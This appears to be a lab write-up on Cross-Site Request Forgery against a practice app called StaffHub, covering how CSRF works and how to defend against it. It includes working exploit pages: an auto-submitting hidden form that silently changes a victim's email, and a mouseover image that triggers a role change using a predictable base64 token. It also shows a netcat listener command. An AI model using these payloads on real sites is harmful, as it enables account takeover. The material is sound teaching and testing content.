# CSRF — Cross-Site Request Forgery

## Overview

Cross-Site Request Forgery (CSRF) is a web vulnerability where an attacker tricks an authenticated user's browser into sending a request to a target application on the attacker's behalf — without the user's knowledge or consent. Because browsers automatically attach session cookies to every request to the same domain, the application receives what looks like a legitimate, authenticated action.

This room covers how CSRF works mechanically, why browsers behave this way by design, how to identify vulnerable features, and two practical exploitation scenarios: forging a POST request via a hidden form and bypassing a weak token-based CSRF protection using an image-based payload.

**Skills introduced:** CSRF attack mechanics, crafting malicious HTML pages, identifying state-changing requests, recognising absent or weak CSRF tokens, and understanding proper CSRF defences.

---

## Concepts Covered

### How CSRF Works

When a user logs in to a web application, the server creates a session and sends a session cookie to the browser. The browser stores this cookie and automatically includes it in every subsequent request to that domain — regardless of which page triggered the request. This is browser behaviour by design, not a bug.

CSRF exploits this automatic cookie attachment. A malicious page on `evil.com` can trigger an HTTP request to `staffhub.thm`. The browser sends the request and automatically includes the victim's session cookie for `staffhub.thm`. The application sees a valid authenticated session and processes the request.

**Three conditions required for CSRF to work:**

| Condition | Description |
|-----------|-------------|
| Victim is authenticated | A valid session cookie exists in the browser |
| Application performs state-changing actions | The target action modifies data (email, password, settings, transactions) |
| No origin verification | The application does not verify that the request came from a trusted source |

### Why GET vs POST Does Not Matter

A common misconception is that using POST requests prevents CSRF. This is false. Both GET and POST requests carry the session cookie automatically. POST body parameters are just as forgeable as GET parameters. The protection must come from a server-side token that cannot be predicted or forged, not from the choice of HTTP method.

### CSRF Tokens — Purpose and Requirements

A CSRF token is a secret value generated per-session (or per-request) and embedded in forms. When a form is submitted, the server verifies that the token in the request matches the expected value. A malicious page cannot read the token from the legitimate site because the same-origin policy prevents cross-origin JavaScript from reading another domain's page content — and therefore cannot include the correct token in a forged request.

For CSRF tokens to be effective they must be:
- **Unique per session** (or per request)
- **Unpredictable** — cryptographically random
- **Tied to the user session** — the server validates the token against the session
- **Validated server-side on every state-changing request**

A token that is predictable or reversible (e.g., base64-encoded from known user data) provides no real protection.

---

## Methodology

```
1. Identify state-changing requests:
   Test all application features that modify data.
   Focus on: email change, password change, profile update,
   financial transactions, role changes, security settings.

2. Inspect requests for CSRF tokens:
   Use browser DevTools or Burp Suite to examine form POSTs.
   Is a CSRF token included? Is it static? Is it predictable?

3. Analyse HTTP methods:
   Important actions via GET are trivially exploitable (image tags, links).
   POST actions require a form submit — but are still exploitable.

4. Test from outside the application:
   Create an HTML page that reproduces the request.
   If the action succeeds without triggering any CSRF protection → vulnerable.

5. Check cookie behaviour:
   Does authentication rely solely on session cookies?
   Are SameSite cookie attributes set?
```

---

## Practical Activities

### Activity 1 — Forging a POST Request (No CSRF Token)

**Objective:** Change a victim's email address by exploiting a missing CSRF token on the `/update_email.php` endpoint.

**Observation:** The email update form sends a POST with only the `email` parameter — no CSRF token or additional verification:

```html
<form action="update_email.php" method="POST">
  <input type="email" name="email" required>
  <button type="submit">Update Email</button>
</form>
```

**Why it is vulnerable:** The server accepts the POST request solely because it contains a valid session cookie. It has no mechanism to verify the request originated from the legitimate page.

**Crafting the malicious page (`settings.html`):**

```html
<html>
<body>
  <form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
    <input type="hidden" name="email" value="attacker@evilmail.thm">
  </form>
  <script>
    document.getElementById("attack").submit();
    setTimeout(function() {
      window.location.href = "http://staffhub.thm:8080/settings.php";
    }, 1000);
  </script>
</body>
</html>
```

**How it works:**
- The page contains a hidden form pointing at the legitimate application endpoint
- JavaScript auto-submits the form immediately when the page loads — the victim never clicks anything
- The browser sends the POST to `staffhub.thm:8080` and automatically attaches the victim's session cookie
- From the server's perspective, it received a valid authenticated POST — it processes the email change
- The 1-second redirect covers the action by returning the victim to the settings page, obscuring what happened

**Findings:** When a victim who is logged into StaffHub visits `http://ATTACKER_IP:81/settings.html`, their email is silently changed to `attacker@evilmail.thm`. The attacker can then use password reset functionality on the new email address to complete account takeover.

**Why this matters:** The attack requires no knowledge of the victim's password and no interaction beyond visiting a URL. The attacker delivers the link via phishing, chat, or email.

---

### Activity 2 — Bypassing Weak Token Protection (Image-Based CSRF)

**Objective:** Exploit a predictable CSRF token to change a user's role from `admin` to `staff`.

**Observation:** The role-update feature appears protected by a CSRF token:

```html
<input type="hidden" name="csrf_token" value="YWRtaW4=">
```

**Token analysis:**
```bash
echo 'YWRtaW4=' | base64 -d
# Output: admin
```

The token is simply the base64 encoding of the user's current role. It is completely predictable — an attacker who knows the target's role can compute the token without making any request to the application.

**Why this fails as protection:** A CSRF token must be secret and unpredictable. A token derived from known user data (username, role, ID) can be computed by the attacker without having any legitimate session. The base64 encoding is reversible transformation, not cryptography.

**Crafting the malicious page (`role.html`) — image-based CSRF via `onmouseover`:**

```html
<html>
<body>
  <h2>StaffHub Internal Notice</h2>
  <p>Move your mouse over the banner below to load the latest role updates.</p>
  <img src="http://staffhub.thm:8080/one.png"
       onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
       width="400">
</body>
</html>
```

**How it works:**
- The page displays an image that looks legitimate ("Internal Notice")
- When the victim hovers over the image, the `onmouseover` event fires
- The browser navigates to the `update_role.php` endpoint with the role parameter and precomputed CSRF token
- The request includes the victim's session cookie automatically
- The application validates the token (which matches), processes the role change

**Findings:** Hovering over the image changes the logged-in user's role from `admin` to `staff`. The attacker precomputed the token by base64-encoding the target role. No session from the target was needed to determine the token value.

**Why the delivery method differs:** The first attack used a form submit because the endpoint was POST. This attack targets a GET endpoint (`?role=staff&csrf_token=...`), so any browser navigation — including JavaScript redirection on mouseover — works. GET-based state-changing endpoints are often even easier to exploit (can be triggered via `<img src="...">` or `<a href="...">` without any user interaction beyond page load).

---

## Observations and Analysis

- The StaffHub email update endpoint accepted POST requests with only the session cookie as authentication. No second factor, no origin check, no referer validation, no token.
- The role update endpoint had what appeared to be a security control but used a completely reversible encoding as the "token" — creating a false sense of security.
- The `onmouseover` attack vector demonstrates that CSRF payloads do not always require form submissions. Any browser navigation event that carries cookies — including image hover events — can trigger state-changing GET requests.
- The redirect in Activity 1 (navigating the victim back to the settings page) is a social engineering quality-of-life detail that makes the attack less detectable. Without it, the victim would land on the attacker's page after the email change.
- CSRF attacks are particularly effective against internal tools and admin portals where developers may apply less security scrutiny than to public-facing features.

---

## Tools and Technologies Used

### Browser Developer Tools
- **Purpose:** Inspect forms, view page source, observe request parameters
- **How used:** Identified the absence of CSRF tokens in form submissions; observed hidden fields

### Netcat (`nc`)
- **Purpose:** Listen for incoming connections (referenced in related XSS tasks for cookie exfiltration)
- **Common usage:** `nc -nlvp 9001`

### Text Editor / `nano`
- **Purpose:** Create malicious HTML pages on the AttackBox
- **How used:** Wrote `settings.html` and `role.html` in `/var/www/html` to serve via the AttackBox HTTP server

### Python/Apache HTTP Server (AttackBox)
- **Purpose:** Serve the malicious HTML pages to the victim browser
- **How used:** Files placed in `/var/www/html` served on port 81

---

## Key Learnings

- CSRF exploits browser behaviour — automatic cookie attachment is a feature, not a flaw; the application's missing verification is the vulnerability
- GET requests for state-changing actions are the easiest CSRF target — triggerable with a single URL or image tag
- Base64 encoding is not security — any "token" derived from predictable values provides no CSRF protection
- A proper CSRF token must be: server-generated, cryptographically random, session-tied, validated on every state-changing request
- The attacker never needs the victim's credentials — only their active session (which their browser automatically provides)
- SameSite cookie attributes (`SameSite=Strict` or `SameSite=Lax`) are a modern defence that prevents cookies from being sent with cross-site requests; they reduce CSRF risk without requiring token management

---

## Real-World Relevance

- **Penetration testing:** CSRF is tested on every web application assessment, particularly against account management, financial transaction, and admin-panel features.
- **Bug bounty:** CSRF findings on high-impact endpoints (account takeover via email change + password reset, financial actions) are typically rated Medium to High severity.
- **Enterprise environments:** Internal tools and admin portals built quickly without security review often lack CSRF protection.
- **Red team operations:** CSRF enables account modification without credential theft — combined with phishing, it can escalate privileges or create persistent access.

---

## Things Worth Remembering

- CSRF conditions: authenticated victim + state-changing action + no origin verification
- POST vs GET does not determine exploitability — cookies are attached to both
- Hidden forms + auto-submit JavaScript = stealthy CSRF exploit for POST endpoints
- `onmouseover`, `onload`, `<img src>` = CSRF vectors for GET endpoints requiring no form
- Base64-encoded tokens derived from known data = zero security value
- Real CSRF token requirements: random, session-bound, server-validated, single-use (or per-session)
- `SameSite=Strict`: browser never sends cookie with cross-site requests — strong CSRF mitigation
- `SameSite=Lax`: sent with top-level navigations (e.g., link clicks) but not background requests — moderate protection

---

## Conclusion

CSRF demonstrates that browsers following their own specification can be weaponised against web applications that fail to verify request origin. The two practical attacks illustrated the contrast between complete absence of protection and the false confidence of predictable token protection. Both are exploitable; only the delivery mechanism differs. The fundamental lesson is that any state-changing action accessible to an authenticated session requires server-side verification that the request originated intentionally from the application's own interface — a burden that CSRF tokens, properly implemented, carry reliably.
